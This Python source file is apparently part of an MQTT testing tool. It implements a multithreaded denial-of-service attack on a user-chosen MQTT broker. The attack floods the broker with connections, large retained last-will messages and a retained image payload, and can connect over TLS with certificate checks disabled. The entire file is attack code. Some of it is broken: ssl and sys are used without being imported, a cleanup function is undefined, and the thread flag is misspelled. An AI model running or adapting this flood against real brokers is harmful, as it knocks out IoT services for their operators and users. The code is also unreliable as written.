import random
import threading
import time
from multiprocessing import Process
import paho.mqtt.client as mqtt

def broker_dos(host, port, connections, topic="", tls_cert=None, client_cert=None):
    client = mqtt.Client()

    f= open("dos/tree.jpg", 'rb')
    filecontent = f.read()
    byteArr = bytearray(filecontent)

    client.publish(topic,byteArr,0,True)

    # we create a number of connections equal to the 'connection' parameter
    for x in range(1, int(connections)):

        # we use a random number as the client_id
        c_id = random.randint(1,10000)
        client.reinitialise(client_id=c_id, clean_session=False, userdata=None)

        # we create a sufficiently large payload
        data = ""
        for i in range(1, 1000):
            data += "testtesttesttesttesttest"
        # if the topic is specified we try to set it as the last_will_topic while we set data as the last_will_message
        if topic != "":
            client.will_set(topic, payload=data, qos=2, retain=True)
        else:
            client.will_set("Topic1", payload=data, qos=2, retain=True)
        try:
            # if the path to a CA certificate is available, we try to connect over TLS
            if tls_cert != None:
                client.tls_set(tls_cert, client_cert, None, cert_reqs=ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLS, ciphers=None)
                client.tls_insecure_set(True)
            client.connect(host, port, keepalive=60, bind_address="")
        except:
            pass

def threaded_broker_dos(host, port, threads, connections, topic="", tls_cert=None, client_cert=None):
    # an array containing all the threads we'll create
    ts = []
    # we create a number of threads equal to the threads parameter
    for i in range(int(threads)):
        try:
            th = threading.Thread(target=broker_dos, args=(host, port, connections, topic, tls_cert, client_cert), name="User-" + str(1))
            # thread dies if it exits!
            th.Daemon = True
            ts.append(th)
        except (KeyboardInterrupt, SystemExit):
            cleanup_stop_thread()
            sys.exit()
        except Exception as e:
            print("error creating thread: " + str(e))
    for t in ts:
        # start all the threads
        t.start()
    for t in ts:
        # make the attack sequential
        t.join()
    # in the current implementation of the tool we are not able to check if the attack was successful or not
    # therefore, we return always False
    return False

# used for testing purposes
if __name__ == "__main__":
    host = input("Enter host address:")
    port = input("Enter port number:")
    threads = input("Enter number of threads:")
    tls_cert = input("Specify CA certificate (empty if no TLS):")
    client_cert = input("Specify client certificate (empty if no TLS):")
    threads = int(threads)
    port = int(port)
    if tls_cert == "":
        tls_cert = None
    if client_cert == "":
        client_cert = None
    print(threaded_broker_dos(host, port, threads=threads, connections=500, topic="Topic1", tls_cert=tls_cert))
